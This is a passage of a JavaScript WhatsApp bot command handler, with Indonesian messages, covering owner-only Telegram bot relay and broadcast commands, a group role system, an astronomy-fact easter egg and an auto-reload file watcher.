      tgBots[tgstNum-1].mirrorTarget=from; saveTgBots();
      reply(`🎯 Target mirror bot *${tgBots[tgstNum-1].label}* → chat ini!`);
      break;
    }

    case "tgsend": {
      if (!isOwner){reply("❌ Owner only!");break;}
      const tgsnP=q.split(' '); const tgsnNum=parseInt(tgsnP[0]); const tgsnPesan=tgsnP.slice(1).join(' ');
      if(isNaN(tgsnNum)||!tgsnPesan){reply("❌ .tgsend [nomor] [pesan]");break;}
      if(tgsnNum<1||tgsnNum>tgBots.length){reply("❌ Nomor tidak valid!");break;}
      const tgsnBot=tgBots[tgsnNum-1]; if(!tgsnBot.token||!tgsnBot.chatId){reply(`❌ Bot *${tgsnBot.label}* belum punya chatId!\nKirim !setchat di Telegram.`);break;}
      const tgsnRes=await tgCall(tgsnBot.token,"sendMessage",{chat_id:tgsnBot.chatId,text:`📱 *Pesan dari WA Bot*\n\n${tgsnPesan}`,parse_mode:"Markdown"});
      reply(tgsnRes?.ok?`✅ Pesan terkirim ke *${tgsnBot.label}*!`:`❌ Gagal kirim ke *${tgsnBot.label}*!`);
      break;
    }

    case "tgbc": {
      if (!isOwner){reply("❌ Owner only!");break;} if (!q){reply("❌ .tgbc [pesan]");break;}
      const tgbcConn=tgBots.filter(b=>b.token&&b.chatId);
      if (!tgbcConn.length){reply("❌ Belum ada bot dengan Chat ID!");break;}
      await tgBroadcastAll(`📢 *[BC dari WA Bot]*\n\n${q}`);
      reply(`✅ Pesan dikirim ke *${tgbcConn.length}* bot Telegram!`);
      break;
    }

    case "tgdisconnect": {
      if (!isOwner){reply("❌ Owner only!");break;}
      const tgdcNum=parseInt(q); if(isNaN(tgdcNum)||tgdcNum<1||tgdcNum>tgBots.length){reply("❌ .tgdisconnect [nomor]");break;}
      const tgdcBot=tgBots[tgdcNum-1]; stopBotPolling(tgdcBot.id); tgdcBot.token=null;tgdcBot.chatId=null;tgdcBot.mirror=false; saveTgBots();
      reply(`🔌 Bot *${tgdcBot.label}* diputus!`);
      break;
    }

    case "tgstopall": { if (!isOwner){reply("❌ Owner only!");break;} stopAllPolling(); reply("🛑 Semua polling TG dihentikan!"); break; }

    // ══════════════════════════════════════════════════════════
    //  ROLE SYSTEM
    // ══════════════════════════════════════════════════════════
    case "setrole": {
      if (!isAdmins&&!isOwner){reply("❌ Admin/Owner only!");break;}
      const srTarget=m.mentionedJid?.[0]; if(!srTarget){reply("❌ .setrole @tag [nama role]");break;}
      const srRole=args.slice(1).join(' ').trim(); if(!srRole){reply("❌ Nama role tidak boleh kosong!");break;}
      roleDB.set(srTarget,srRole); saveState();
      await WaSocket.sendMessage(m.chat,{text:`✅ *Role diberikan!*\n\n👤 @${srTarget.split('@')[0]}\n🏷️ Role : *${srRole}*`,mentions:[srTarget]},{quoted:x});
      break;
    }

    case "delrole": {
      if (!isAdmins&&!isOwner){reply("❌ Admin/Owner only!");break;}
      const drTarget=m.mentionedJid?.[0]; if(!drTarget){reply("❌ .delrole @tag");break;}
      if(!roleDB.has(drTarget)){reply(`❌ @${drTarget.split('@')[0]} tidak punya role!`);break;}
      const drPrev=roleDB.get(drTarget); roleDB.delete(drTarget); saveState();
      await WaSocket.sendMessage(m.chat,{text:`✅ *Role dihapus!*\n\n👤 @${drTarget.split('@')[0]}\n🏷️ Sebelumnya : ${drPrev}`,mentions:[drTarget]},{quoted:x});
      break;
    }

    case "listrole": {
      const lrRoles=[]; const lrMentions=[];
      for(const[jid,role] of roleDB.entries()){
        const inG=participants.some(p=>p.id===jid);
        if(!isGroup||inG){lrRoles.push(`👤 @${jid.split('@')[0]} → 🏷️ *${role}*`);lrMentions.push(jid);}
      }
      if (!lrRoles.length){reply("📋 Belum ada role.");break;}
      await WaSocket.sendMessage(m.chat,{text:`📋 *DAFTAR ROLE*\n\n${lrRoles.join('\n')}\n\nTotal: ${lrRoles.length}`,mentions:lrMentions},{quoted:x});
      break;
    }

    case "myrole": {
      const mrRole=roleDB.get(m.sender)||"User";
      reply(`${mrRole==="User"?"👤":mrRole.toLowerCase().includes("king")?"👑":"🏷️"} *Role Kamu*\n\n🏷️ ${mrRole}`);
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  XYC
    // ══════════════════════════════════════════════════════════
    case "xyc": {
      const xycQ = [
        "💫 100 billion planets in the Milky Way.",
        "🕳️ Supermassive black holes: millions times the Sun's mass.",
        "🌌 Andromeda's light took 2.5 million years to reach us.",
        "✨ 2 trillion galaxies in the observable universe.",
        "🌑 Dark matter controls 85% of galaxy mass.",
        "💥 Milky Way + Andromeda collision in 4.5 billion years.",
        "🪐 One galactic year = 225 million Earth years.",
        "🔭 GN-z11: oldest galaxy, born 400M years after Big Bang."
      ];
      await WaSocket.sendMessage(m.chat, {
        interactiveMessage: {
          title: "Easter Egg — Cryskyy × Aptx",
          image: CryskyyLogo,
          nativeFlowMessage: { buttons: [
            {name:"single_select"},
            {name:"single_select", buttonParamsJson: JSON.stringify({
              icon:"REVIEW", title:"Cryskyy Project Exp",
              sections:[{title:xycQ[Math.floor(Math.random()*xycQ.length)],rows:[{title:"-",id:"-"}]}]
            })}
          ]}
        }
      }, { quoted: x });
      break;
    }

    // ══════════════════════════════════════════════════════════
    //  DEFAULT
    // ══════════════════════════════════════════════════════════
    default: {
      // Tidak ada command yang cocok, diam saja
      break;
    }

  } // end switch

}; // end module.exports

// ── Auto-reload ────────────────────────────────────────────────
let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
  require('fs').unwatchFile(file);
  console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
  delete require.cache[file];
  require(file);
});